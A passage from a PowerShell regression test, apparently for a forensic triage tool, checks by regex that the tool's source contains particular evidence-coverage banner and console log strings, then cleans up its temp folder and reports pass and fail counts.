Check "A7 banner: N/M sources next to the coverage number, v2.55 wording verbatim (v2.77: weighted percent AND raw fraction, rounded like the bar)" ($src -match [regex]::Escape('Evidence coverage: $confPct% weighted ($($v.CoverageSourcesCollected)/$($v.CoverageSourcesTotal) sources, $covMiss missing) - how much of the case was collected, not a probability of compromise'))
Check "A7 console verdict log: N/M sources" ($src -match [regex]::Escape('(evidence coverage $($script:Verdict.ConfidencePercent)%, $($script:Verdict.CoverageSourcesCollected)/$($script:Verdict.CoverageSourcesTotal) sources) - '))
Check "A7 console summary line: N/M sources" ($src -match [regex]::Escape('(evidence coverage $($script:Verdict.ConfidencePercent)%, $($script:Verdict.CoverageSourcesCollected)/$($script:Verdict.CoverageSourcesTotal) sources)  - details'))
Check "rider: inert `$($_.Detail) read dropped from the EcsConfigs predicate (Evidence-only)" ($src -notmatch [regex]::Escape('$($_.Detail) $($_.Evidence)') -and $src -match [regex]::Escape('$hd = "$($_.Evidence)"'))

Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
if ($fail -gt 0) { Write-Host "`ntest_v264: $pass passed, $fail FAILED" -ForegroundColor Red; exit 1 }
Write-Host "`ntest_v264: $pass passed, 0 failed" -ForegroundColor Green
exit 0
